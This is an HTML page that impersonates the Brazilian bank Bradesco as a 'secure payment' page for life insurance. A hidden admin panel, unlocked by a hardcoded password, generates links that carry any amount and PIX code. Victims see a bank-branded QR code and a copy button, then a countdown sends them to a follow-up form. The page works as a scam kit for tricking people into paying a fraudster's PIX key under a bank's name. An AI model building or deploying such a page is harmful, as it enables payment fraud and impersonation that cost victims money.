<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Pagamento Seguro</title>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<style>
body { font-family: Arial; background:#f4f6f9; margin:0;}

.header {
    background: linear-gradient(90deg,#cc092f,#a30726);
    padding:18px;
    text-align:center;
}
.logo-text { color:white; font-size:26px; font-weight:bold;}

.container {
    max-width:400px;
    margin:30px auto;
    background:white;
    padding:25px;
    border-radius:18px;
    text-align:center;
}

.valor {
    font-size:30px;
    color:#cc092f;
    font-weight:bold;
}

button {
    width:100%;
    padding:12px;
    margin-top:10px;
    border-radius:10px;
    border:none;
    background:#cc092f;
    color:white;
}

textarea { width:100%; margin-top:10px; padding:10px;}

.hidden { display:none; }
</style>
</head>

<body>

<div class="header">
    <div class="logo-text">Bradesco</div>
</div>

<div class="container" id="cliente">

    <div>🔒 Pagamento Seguro</div>

    <h3>Seguro de Vida</h3>

    <div class="valor" id="valor">R$ 0,00</div>

    <div id="qr"></div>

    <button onclick="copiar()">Copiar código PIX</button>

    <textarea id="codigoPix" readonly></textarea>

    <button onclick="irFormulario()">Já fiz o pagamento</button>

    <div id="timer"></div>

</div>

<div class="container hidden" id="admin">
    <h3>Admin</h3>

    <input id="valorInput" placeholder="Valor">
    <input id="pixInput" placeholder="Código PIX">

    <button onclick="gerar()">Gerar link</button>

    <p id="link"></p>
</div>

<script>
const SENHA = "153319";
let tempo = 50;
let countdown;

/* ADMIN */
if(location.pathname=="/admin"){
    let s = prompt("Senha:");
    if(s===SENHA){
        admin.classList.remove("hidden");
        cliente.style.display="none";
    } else {
        alert("Sem acesso");
    }
}

/* GERAR LINK */
function gerar(){
    let valor = valorInput.value;
    let pix = pixInput.value;

    let linkFinal = location.origin + "/?valor="+valor+"&pix="+encodeURIComponent(pix);

    link.innerText = linkFinal;
}

/* CARREGAR */
function carregar(){
    let p = new URLSearchParams(location.search);

    let valor = p.get("valor");
    let pix = p.get("pix");

    if(!valor || !pix) return;

    document.getElementById("valor").innerText = "R$ "+valor;
    codigoPix.value = pix;

    window.pix = pix;

    new QRCode(qr, {text:pix,width:200,height:200});
}

/* COPIAR + TIMER */
function copiar(){
    navigator.clipboard.writeText(window.pix);
    alert("Copiado!");

    tempo = 50;

    countdown = setInterval(()=>{
        document.getElementById("timer").innerText =
        "Redirecionando em "+tempo+"s para confirmação...";

        tempo--;

        if(tempo <= 0){
            clearInterval(countdown);
            irFormulario();
        }

    },1000);
}

/* IR PARA FORM */
function irFormulario(){
    let params = new URLSearchParams(location.search);
    window.location.href = "form.html?"+params.toString();
}

carregar();
</script>

</body>
</html>
